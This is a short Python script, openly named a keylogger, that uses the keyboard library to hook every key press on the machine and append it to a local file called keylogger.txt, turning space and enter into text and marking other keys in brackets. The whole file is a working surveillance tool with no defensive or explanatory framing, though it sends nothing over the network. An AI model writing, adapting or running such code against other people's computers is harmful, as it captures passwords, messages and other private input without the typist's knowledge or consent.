import keyboard
from datetime import datetime

log_file="keylogger.txt"    #log file

def write_down_key(event):
    with open(log_file, 'a') as f:
        if event.name == "space":
            f.write(" ")
        elif event.name== "enter":
            f.write("\n")
        elif len(event.name) == 1:
            f.write(event.name)
        else:
            f.write(f"[{event.name}]")

keyboard.on_press(write_down_key)


keyboard.wait()
